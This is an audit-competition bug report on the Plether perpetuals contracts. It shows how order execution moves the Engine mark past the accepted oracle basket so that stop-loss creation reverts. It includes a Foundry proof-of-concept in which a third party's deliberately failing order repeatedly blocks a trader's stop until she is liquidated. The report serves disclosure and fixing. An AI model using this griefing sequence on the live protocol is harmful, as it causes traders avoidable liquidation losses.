# \#99640 [SC-Low] Creating, replacing or attaching a stop loss reverts after an order execution until a separate mark refresh lands, and an order that costs its sender nothing breaks the create again, so the trader's position is liquidated instead of stopped out

**Submitted on Nov 14th 2026 at 15:39:45 UTC by @jh42 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99640
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description


### 1. Brief/Intro

A trader arms a stop loss or take profit through `createPositionProtection`, `replacePositionProtection` or `commitOpenOrderWithProtection`, and all three first call `_freshProtectionObservation()`, which reads the oracle's accepted live basket with `getLatestPrice(MarkRefresh)`. Executing an order installs that order's historical tick as the Engine mark whenever the tick is newer than the current mark, and it never writes the accepted live basket, so afterwards the accepted basket is older than the Engine mark and the oracle read reverts `PletherOracle__PriceOutOfOrder(acceptedTime, engineTime)`. The Book's own `_acceptedMarkInstalled()` treats exactly that state (`acceptedTime < markTime`) as valid and arms an attached protection from it when the parent order fills, but the oracle read comes first, so create, replace and attach never reach that branch. Arming works again only after a separate `Router.updateMarkPrice` refresh lands with no order executed before the arming transaction. Any account can execute a pending order, and an order that fails on slippage moves the mark the same way at a cost of 0 USDG to its sender, so in the PoC three refresh-then-create attempts are broken. The trader's 200,000 USDG long is then liquidated and the trader loses 2,000.20 USDG, where an armed stop would have cost 760.86 USDG.

### 3. Root cause

- The Engine mark and the accepted live basket advance through different paths, and the Book requires the accepted basket to be current before it will arm.

**3.1 An order execution installs the Engine mark and leaves the accepted live basket where it was.**

```solidity
// OrderRouterExecutionSidecar.sol L1053-L1061
function _updateEngineMark(
    IOrderRouterExecutionHost host,
    OracleResult memory result
) private {
    ICfdEngineCore engine_ = ICfdEngineCore(host.engine());
    if (result.publishTime > engine_.lastMarkTime()) {
        engine_.updateMarkPrice(result.neutralMarkPrice, result.publishTime);
    }
}
```

- It runs from `_prepareSingleOracle` (L979) and `_prepareBatchOracle` (L1036).
- It runs before the order item executes and outside the item's rollback frame, so the mark stays advanced when the order then fails terminally.

**3.2 The accepted-basket read rejects any basket older than the Engine mark.**

```solidity
// PletherOracle.sol L892-L896 (_snapshotFromBasket with enforcePublishOrder = true), abbreviated
if (enforcePublishOrder) {
    uint64 markTime = engine.lastMarkTime();
    if (snapshot.publishTime < markTime) {
        revert PletherOracle__PriceOutOfOrder(snapshot.publishTime, markTime);
    }
    ...
}
```

- `getLatestPrice(MarkRefresh)` reaches it through `_getLatestPriceSnapshotWithConfidence` (L571-L580).
- An empty payload to `updateMarkPrice` replays the accepted basket and ends in the same check.

**3.3 The Book reads that view before its own installed-check, so the Engine-ahead case its check accepts is never reached.**

```solidity
// PositionProtectionBook.sol L862-L886 (_freshProtectionObservation), abbreviated
uint64 markTime = ENGINE.lastMarkTime();
...
IPletherOracle.PriceSnapshot memory current = oracle.getLatestPrice(IPletherOracle.PriceMode.MarkRefresh);
...
if (!_acceptedMarkInstalled()) {
    revert PositionProtectionBook__OracleMarkAhead();
}

// PositionProtectionBook.sol L888-L895
function _acceptedMarkInstalled() private view returns (bool) {
    (bool accepted, uint256 acceptedPrice, uint64 acceptedTime) = _activeOracle().getAcceptedBasketMark();
    if (!accepted) {
        return true;
    }
    uint64 markTime = ENGINE.lastMarkTime();
    return acceptedTime < markTime || (acceptedTime == markTime && acceptedPrice == ENGINE.lastMarkPrice());
}
```

- `acceptedTime < markTime` is the Engine-ahead case, and `_acceptedMarkInstalled()` returns true for it.
- The oracle read at L880 runs first and has already reverted for that case.
- The three callers are `_create` (L229), `_replace` (L295) and `_stageAttached` (L463).

**3.4 The Book arms from the Engine-ahead state elsewhere**

```solidity
// PositionProtectionBook.sol L596-L605 (afterOrderTerminal, attached parent order executed)
if (terminalStatus == IOrderRouterAccounting.OrderStatus.Executed) {
    _requireMatchingPosition(parentProtection);
    if (!_acceptedMarkInstalled()) {
        _failPendingParent(parentProtection);
        return;
    }
    _arm(parentProtection, ENGINE.lastMarkTime());
    _emitArmed(parentProtection);
    return;
}
```

### 4. Impact


- **Create, replace and attach revert after an order execution that installs a newer mark.**
  - After the trader's own fill, `createPositionProtection` reverts `PriceOutOfOrder(1709535601, 1709535602)`.
  - After another trader's fill, `replacePositionProtection` on an armed protection and `commitOpenOrderWithProtection` revert the same way, and the attach stages no order.
  - The state lasts until a live refresh with fresh data lands. Replaying the accepted basket with an empty payload reverts with the same error.
- **The accepted basket also expires on its own.**
- **A third party can restore the revert between the two transactions of a refresh-then-create sequence.**
  - It is executed one second later with the first tick after its commit, which is newer than the refresh tick.
- **The order can cost its sender nothing.**
  - A short open with price bound 1 fills only at a price of 0.00000001 or less. It fails with a terminal slippage receipt, and the Engine mark has already moved.
- **The repository's reference client does not combine the refresh with the create.**
  - `buildCreateProtectionAction`, `buildReplaceProtectionAction` and `buildProtectedOpenAction` each encode one zero-value call to the Book.
  - No mark refresh is in the plan (`packages/perps-aa-client/src/protection.ts` L41-L56 and L109-L124).
- **The trader's loss when nothing closes the position.**
  - 1,239.34 USDG more than the stop would have cost, from the PoC ledger above.
  - The stop exists to close the position while the trader is not watching, and the denied create leaves no stop.

### 6. User story

1. Alice deposits 20,000 USDG and opens a 200,000 USDG long with 2,000 USDG margin at 1.0000. A keeper fills it, which leaves the Engine mark one second ahead of the accepted basket.
2. Alice wants a stop loss at +30 bps. She sends a refresh with the newest tick, then the create.
3. Carol committed a 1,000 USDG-notional order in the second of that tick, with a price bound it can never meet. One second after Alice's refresh she executes it, and the Engine mark moves one second past the accepted basket.
4. Alice's create reverts `PriceOutOfOrder`. Carol paid nothing. The two repeat twice more.
5. The mark reaches the stop level. No stop is armed, so the position stays open.
6. At +95 bps a keeper liquidates Alice. She loses 2,000.20 USDG instead of 760.86. The keeper receives 100.00 and the pool 1,620.40.

### 7. Recommendation


```diff
--- a/packages/perps/src/PositionProtectionBook.sol
+++ b/packages/perps/src/PositionProtectionBook.sol
@@ -876,6 +876,12 @@
                 || OracleFreshnessPolicyLib.isStale(markTime, policy.maxStaleness, block.timestamp)
         ) {
             revert OrderRouter__ProtectionMarkTooStale();
+        }
+        // Order execution installs historical marks on the Engine without touching the accepted live basket. When the
+        // Engine is ahead, it is the newest accepted observation; reading the older basket would revert in the oracle.
+        (bool hasAcceptedBasket,, uint64 acceptedTime) = oracle.getAcceptedBasketMark();
+        if (hasAcceptedBasket && acceptedTime < markTime) {
+            return (cachedMarkPrice, cachedMarkPrice, markTime);
         }
         IPletherOracle.PriceSnapshot memory current = oracle.getLatestPrice(IPletherOracle.PriceMode.MarkRefresh);
         currentMarkPrice = current.markPrice;
```


## Proof of Concept


## Proof of Concept


```bash
forge test --root packages/perps --match-path test/perps/ProtectionArmingRegression.t.sol -vv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PositionProtectionBook} from "@plether/perps/PositionProtectionBook.sol";
import {IPletherOracle} from "@plether/perps/interfaces/IPletherOracle.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @dev One test, release risk parameters (DEPLOYMENT.md "Initial release parameters"), public flows only:
///      commitOrder, executeOrder, updateMarkPrice, executeLiquidation, triggerPositionProtection and the Book's
///      create / replace / attach. No prank on the router, engine, pool, clearinghouse, oracle or token, and no storage
///      write. Harness values that are not release values: the oracle is the shared MockPyth with two feeds at one
///      price and confidence 0, and the pool is BasePerpTest's setUp funding (about 1.002M USDG). Router and oracle
///      limits are the constructor defaults.
contract ProtectionArmingRegressionTest is BasePerpTest {

    IPositionProtectionActions internal actions;
    IPositionProtectionViews internal views;

    address internal constant ALICE = address(0xA11CE); // trader who wants a stop loss
    address internal constant BOB = address(0xB0B); // trader whose attached protection the Book arms
    address internal constant CAROL = address(0xCA201); // third party whose failing order lands between Alice's steps
    address internal constant KEEPER = address(0xE0EC); // executes orders, triggers and liquidates

    uint256 internal constant MARK = 1e8; // basket 1.0000
    uint256 internal constant SIZE = 200_000e18; // Alice's long: 200,000 USDG notional
    uint256 internal constant MARGIN = 2000e6; // 1% margin
    uint256 internal constant ALICE_FUNDS = 20_000e6;
    uint256 internal constant SMALL_SIZE = 1000e18; // smallest open admitted here: 100 to 900 tokens revert POSITION_TOO_SMALL
    uint256 internal constant SMALL_MARGIN = 100e6;
    // LONG geometry in this protocol: take profit below the mark, stop loss above it.
    uint256 internal constant LONG_TP = 99_000_000;
    uint256 internal constant LONG_SL = 101_000_000;
    uint256 internal constant STOP = 100_300_000; // Alice's stop: +30 bps against her
    uint256 internal constant LIQ_MARK = 100_950_000; // +95 bps against her: past her liquidation threshold

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        PositionProtectionBook book = PositionProtectionBook(address(router.positionProtectionBook()));
        actions = IPositionProtectionActions(address(book));
        views = IPositionProtectionViews(address(book));

        _fundTrader(ALICE, ALICE_FUNDS);
        _fundTrader(BOB, 50_000e6);
        _fundTrader(CAROL, 50_000e6);
        _fundTrader(KEEPER, 1e6);

        // The accepted live basket and the Engine mark start in agreement, through the public refresh.
        _refreshMark(MARK);
    }

    /// @notice After an order execution installs a newer Engine mark, creating a stop loss reverts `PriceOutOfOrder`
    ///         although every price is fresh, and the Book's own arm path accepts exactly that state. A third party's
    ///         order that costs its sender nothing recreates the state between a trader's refresh and create, so the
    ///         trader is liquidated instead of stopped out.
    function test_OrderExecutionDeniesStopLossArming_TraderLiquidatedInsteadOfStoppedOut() public {
        uint256 clean = vm.snapshotState();

        // ---- 1. The Book arms from "Engine mark ahead of the accepted basket", and refuses the owner the same state ----
        {
            OrderV3Types.OrderRequest memory request = _openRequest(CfdTypes.Side.LONG, 10_000e18, 2000e6);
            vm.prank(BOB);
            (uint64 parentOrderId, uint64 attachedId) =
                actions.commitOpenOrderWithProtection(request, _params(LONG_TP, LONG_SL));
            bytes[] memory fillData = _mockPythUpdateData(MARK);
            vm.prank(KEEPER);
            router.executeOrder(parentOrderId, fillData);

            (uint64 acceptedTime, uint64 engineTime) = _markTimes();
            assertEq(
                engineTime, acceptedTime + 1, "the fill left the Engine mark one second ahead of the accepted basket"
            );
            assertEq(
                uint8(_status(attachedId)),
                uint8(PositionProtectionTypes.PositionProtectionStatus.Armed),
                "the Book's own fill path armed the protection from that state"
            );

            vm.prank(BOB);
            vm.expectRevert(_outOfOrder(acceptedTime, engineTime));
            actions.replacePositionProtection(attachedId, _params(LONG_TP + 500_000, LONG_SL - 500_000));
        }
        vm.revertToState(clean);

        // ---- 2. Alice opens a 200,000 USDG long with 2,000 USDG margin ----
        _commitAndFill(ALICE, CfdTypes.Side.LONG, SIZE, MARGIN);
        assertEq(_size(ALICE), SIZE);
        uint256 poolAfterOpen = pool.totalAssets();
        uint256 opened = vm.snapshotState();

        // ---- 3. Control: refresh, create, nothing in between. The stop is armed and executes at the stop level ----
        _refreshMark(MARK);
        vm.prank(ALICE);
        uint64 controlId = actions.createPositionProtection(_params(0, STOP));
        assertEq(
            uint8(_status(controlId)),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Armed),
            "control: the stop is armed"
        );
        vm.warp(vm.getBlockTimestamp() + 1 hours);
        vm.roll(vm.getBlockNumber() + 1);
        bytes[] memory stopLive = _liveDataAt(STOP, vm.getBlockTimestamp());
        vm.prank(KEEPER);
        uint64 attempt = actions.triggerPositionProtection(controlId, stopLive);
        bytes[] memory closeData = _mockPythUpdateData(STOP);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory executed = router.executeOrder(attempt, closeData);
        assertEq(uint8(executed.status), uint8(OrderV3Types.LifecycleStatus.Executed), "control: the stop executes");
        assertEq(_size(ALICE), 0, "control: Alice is out at her stop");
        uint256 controlLoss = ALICE_FUNDS - _total(ALICE);
        int256 controlPoolChange = int256(pool.totalAssets()) - int256(poolAfterOpen);
        vm.revertToState(opened);

        // ---- 4. Attack: Alice refreshes and creates three times. Carol's failing order lands between each pair ----
        uint256 carolBefore = _total(CAROL);
        PositionProtectionTypes.PositionProtectionParams memory stopOnly = _params(0, STOP);
        for (uint256 round; round < 3; ++round) {
            (uint64 acceptedTime, uint64 engineTime) = _carolsFailingOrderBetweenAliceRefreshAndCreate();
            assertEq(
                vm.getBlockTimestamp() - acceptedTime,
                2,
                "the accepted basket is two seconds old, far inside every limit"
            );
            assertEq(engineTime, acceptedTime + 1, "Carol's execution moved the Engine mark past the accepted basket");
            vm.prank(ALICE);
            vm.expectRevert(_outOfOrder(acceptedTime, engineTime));
            actions.createPositionProtection(stopOnly);
        }
        assertEq(views.activePositionProtectionId(ALICE), 0, "Alice never armed");
        assertEq(_total(CAROL), carolBefore, "three denied attempts cost Carol nothing");
        assertEq(_size(CAROL), 0, "Carol holds no position");

        // ---- 5. The mark reaches the stop level and nothing closes the position. Later it reaches liquidation ----
        vm.warp(vm.getBlockTimestamp() + 1 hours);
        vm.roll(vm.getBlockNumber() + 1);
        bytes[] memory atStop = _liveDataAt(STOP, vm.getBlockTimestamp());
        router.updateMarkPrice(atStop);
        assertEq(_size(ALICE), SIZE, "Alice's position is still open at the stop level");

        vm.warp(vm.getBlockTimestamp() + 1 hours);
        vm.roll(vm.getBlockNumber() + 1);
        uint256 keeperBefore = clearinghouse.balanceAssets(KEEPER);
        uint256 aliceBeforeLiquidation = _total(ALICE);
        bytes[] memory liqLive = _liveDataAt(LIQ_MARK, vm.getBlockTimestamp());
        vm.prank(KEEPER);
        router.executeLiquidation(ALICE, liqLive);
        assertEq(_size(ALICE), 0, "Alice is liquidated");

        uint256 attackLoss = ALICE_FUNDS - _total(ALICE);
        uint256 liquidationBounty = clearinghouse.balanceAssets(KEEPER) - keeperBefore;
        int256 attackPoolChange = int256(pool.totalAssets()) - int256(poolAfterOpen);

        emit log_string("Alice: 200,000 USDG long, 2,000 USDG margin, stop loss intended at +30 bps");
        emit log_named_decimal_uint("Alice total loss, stop armed and executed (control)", controlLoss, 6);
        emit log_named_decimal_uint("Alice total loss, arming denied, liquidated        ", attackLoss, 6);
        emit log_named_decimal_uint("Alice extra loss                                   ", attackLoss - controlLoss, 6);
        emit log_named_decimal_uint(
            "Alice equity taken at the liquidation              ", aliceBeforeLiquidation - _total(ALICE), 6
        );
        emit log_named_decimal_uint("  to the liquidating keeper                        ", liquidationBounty, 6);
        emit log_named_decimal_int("pool cash change since Alice's open, control        ", controlPoolChange, 6);
        emit log_named_decimal_int("pool cash change since Alice's open, attack         ", attackPoolChange, 6);

        assertLt(controlLoss, 800e6, "control: Alice loses the 30 bps move plus fees");
        assertGt(attackLoss, 1990e6, "attack: Alice loses her whole margin");
        assertGt(attackLoss - controlLoss, 1200e6, "denied arming costs Alice more than 1,200 USDG");
        assertEq(liquidationBounty, 100e6, "the liquidating keeper collects half of the 10 bps bounty");
        assertGt(attackPoolChange, controlPoolChange + 1000e6, "the pool keeps the equity the stop would have saved");
    }

    // ------------------------------------------------------------------------------------------------------------
    // Carol commits a SHORT open with price bound 1 in the second of Alice's refresh tick, before the refresh lands.
    // Alice refreshes with the newest tick. One second later Carol executes her own order with the first tick after
    // its commit: the bound can never be met, so it fails terminally on slippage, after the Engine mark has already
    // advanced, and costs her nothing because she executes it herself. Alice's next transaction lands one second after
    // that. Returns the accepted-basket time and the Engine mark time that transaction sees.
    // ------------------------------------------------------------------------------------------------------------
    function _carolsFailingOrderBetweenAliceRefreshAndCreate()
        internal
        returns (uint64 acceptedTime, uint64 engineTime)
    {
        vm.warp(vm.getBlockTimestamp() + 2);
        vm.roll(vm.getBlockNumber() + 1);
        uint256 t = vm.getBlockTimestamp();

        OrderV3Types.OrderRequest memory request = _openRequest(CfdTypes.Side.SHORT, SMALL_SIZE, SMALL_MARGIN);
        request.targetPrice = 1;
        vm.prank(CAROL);
        uint64 orderId = router.commitOrder(request);

        vm.roll(vm.getBlockNumber() + 1);
        bytes[] memory aliceLive = _liveDataAt(MARK, t);
        vm.prank(ALICE);
        router.updateMarkPrice(aliceLive);
        (acceptedTime, engineTime) = _markTimes();
        assertEq(acceptedTime, t);
        assertEq(engineTime, t, "after the refresh the accepted basket and the Engine mark agree");

        vm.warp(t + 1);
        vm.roll(vm.getBlockNumber() + 1);
        bytes[] memory historical = _historicalDataAt(MARK, t + 1);
        vm.prank(CAROL);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, historical);
        assertEq(uint8(result.terminalReason), uint8(OrderV3Types.TerminalReason.Slippage), "terminal slippage failure");

        vm.warp(t + 2);
        vm.roll(vm.getBlockNumber() + 1);
        (acceptedTime, engineTime) = _markTimes();
    }

    // ------------------------------------------------------------------------------------------------------------
    // Helpers
    // ------------------------------------------------------------------------------------------------------------
    function _commitAndFill(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin
    ) internal {
        OrderV3Types.OrderRequest memory request = _openRequest(side, size, margin);
        vm.prank(account);
        uint64 orderId = router.commitOrder(request);
        bytes[] memory data = _mockPythUpdateData(MARK); // one second later: the first tick after the commit
        vm.prank(KEEPER);
        router.executeOrder(orderId, data);
    }

    function _openRequest(
        CfdTypes.Side side,
        uint256 sizeDelta,
        uint256 marginDelta
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = bytes32(uint256(router.nextCommitId()));
        request.side = side;
        request.sizeDelta = sizeDelta;
        request.marginDelta = marginDelta;
        request.targetPrice = side == CfdTypes.Side.LONG ? 1 : engine.CAP_PRICE();
        request.isClose = false;
        request.bounds = _bounds();
    }

    function _bounds() internal view returns (OrderV3Types.ExecutionBounds memory) {
        return OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp + router.maxExecutionWindowSeconds()),
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 1 | 2 | 4,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _params(
        uint256 takeProfit,
        uint256 stopLoss
    ) internal pure returns (PositionProtectionTypes.PositionProtectionParams memory params) {
        params.takeProfitTriggerPrice = takeProfit;
        params.stopLossTriggerPrice = stopLoss;
        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    function _outOfOrder(
        uint64 acceptedTime,
        uint64 engineTime
    ) internal pure returns (bytes memory) {
        return abi.encodeWithSelector(IPletherOracle.PletherOracle__PriceOutOfOrder.selector, acceptedTime, engineTime);
    }

    function _markTimes() internal view returns (uint64 acceptedTime, uint64 engineTime) {
        (,, acceptedTime) = pletherOracle.getAcceptedBasketMark();
        engineTime = engine.lastMarkTime();
    }

    function _status(
        uint64 protectionId
    ) internal view returns (PositionProtectionTypes.PositionProtectionStatus) {
        return views.getPositionProtection(protectionId).status;
    }

    function _size(
        address account
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    function _total(
        address account
    ) internal view returns (uint256) {
        return clearinghouse.balanceAssets(account) + engine.traderClaimBalanceAssets(account);
    }

    /// @dev Public live refresh with a tick published at `block.timestamp`.
    function _refreshMark(
        uint256 price
    ) internal {
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        vm.roll(vm.getBlockNumber() + 1);
        bytes[] memory live = _liveDataAt(price, vm.getBlockTimestamp());
        router.updateMarkPrice(live);
    }

    function _liveDataAt(
        uint256 price,
        uint256 publishTime
    ) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] =
                MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, publishTime, previous));
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _historicalDataAt(
        uint256 price,
        uint256 publishTime
    ) internal returns (bytes[] memory updateData) {
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(), int64(uint64(price)), 0, int32(-8), publishTime, publishTime - 1
        );
        updateData = new bytes[](1);
        updateData[0] = abi.encode(price);
    }

}
```

### Output

```
Ran 1 test for test/perps/ProtectionArmingRegression.t.sol:ProtectionArmingRegressionTest
[PASS] test_OrderExecutionDeniesStopLossArming_TraderLiquidatedInsteadOfStoppedOut() (gas: 12648554)
Logs:
  Alice: 200,000 USDG long, 2,000 USDG margin, stop loss intended at +30 bps
  Alice total loss, stop armed and executed (control): 760.864433
  Alice total loss, arming denied, liquidated        : 2000.200000
  Alice extra loss                                   : 1239.335567
  Alice equity taken at the liquidation              : 1720.399202
    to the liquidating keeper                        : 100.000000
  pool cash change since Alice's open, control        : 480.863635
  pool cash change since Alice's open, attack         : 1620.399202
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 36.78ms (31.62ms CPU time)
Ran 1 test suite in 37.38ms (36.78ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

